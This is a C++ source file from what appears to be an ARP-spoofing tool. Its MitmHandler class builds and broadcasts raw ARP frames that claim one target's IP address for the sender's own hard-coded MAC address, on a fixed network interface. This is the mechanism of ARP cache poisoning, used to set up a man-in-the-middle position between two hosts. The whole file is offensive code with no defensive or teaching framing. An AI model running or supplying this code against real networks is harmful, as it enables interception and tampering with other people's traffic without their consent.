#include "../include/mitmhandler.h"

#define BUF_SIZE 42
#define ARP_PACKET_LEN 28
#define DEVICE "ens33"
#define ETH_P_NULL 0x0
#define ETH_MAC_LEN ETH_ALEN
#define ETH_ARP 0x0806

typedef unsigned char byte;

MitmHandler::MitmHandler(std::string target1_s, std::string target2_s) {
	std::array<byte,4> target1_a, target2_a;
	ArpGyp::stringToIp(target1_s, target1_a);
	ArpGyp::stringToIp(target2_s, target2_a);
	this->send(target1_a, target2_a);
}

MitmHandler::~MitmHandler() {

}

void MitmHandler::send(std::array<byte,4> src_p_addr, std::array<byte,4> dst_p_addr) {

	std::array<byte, 6> dst_mac = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
	std::array<byte, 6> src_mac = {0x00, 0x0c, 0x29, 0xd8, 0x81, 0x46};

	// Init ethernet destination address struct
	sockaddr_ll socket_address;

	// Init the full buffer of the ethernet frame
	void* buffer = (void*)malloc(BUF_SIZE);

	// Define pointer to ethernet header data as part of the buffer
	byte* etherhead = (byte*)buffer;

	// ARP data pointer
	byte* arp_header = ((byte*)buffer) + 14;

	ethhdr *eh = (struct ethhdr *)etherhead;

	int send_result = 0;

	// Set ethernet frame header
	memcpy(eh->h_source, src_mac.data(), 6);
	memcpy(eh->h_dest, dst_mac.data(), 6);

	eh->h_proto = htons(0x0806);

	// Construct arp request
	ArpRequest ar;
	ar.src_hw_addr = src_mac;
	ar.src_p_addr = src_p_addr;
	ar.dst_hw_addr = dst_mac;
	ar.dst_p_addr = dst_p_addr;

	// Setup socket_address struct
	socket_address.sll_family = PF_PACKET;
	socket_address.sll_protocol = htons(ETH_P_ARP);
	// Set index of network interface to use
	socket_address.sll_ifindex = ArpGyp::GetIfIndex(DEVICE);
	// Set frame type to ARP
	socket_address.sll_hatype = ARPHRD_ETHER;
	// Target is other host or broadcast
	socket_address.sll_pkttype = PACKET_BROADCAST; // PACKET_OTHERHOST
	// Set length of ethernet target address
	socket_address.sll_halen = 0; // Or 6 if request, aka ETH_ALEN

	// Set physical destination address
	memcpy(socket_address.sll_addr, eh->h_dest, 6);

	// Padding for physical address
	socket_address.sll_addr[6] = 0x00;
	socket_address.sll_addr[7] = 0x00;

	// Copy the ARP request data into the buffer via arp_header pointer
	memcpy(arp_header, &ar, ARP_PACKET_LEN);
	std::cout << "BUFFER LENGTH: " << BUF_SIZE << std::endl;
	for (int i = 0; i < BUF_SIZE; ++i) {
		std::cout << ArpGyp::ByteToHex(((byte*)buffer)[i]);
	}
	std::cout << std::endl;

	// Send the packet
	send_result = sendto(ArpGyp::s, buffer, BUF_SIZE, 0,
		      (struct sockaddr*)&socket_address, sizeof(socket_address));
	if (send_result == -1) {
		std::cout << "Error while sending payload" << std::endl;
 	}
}
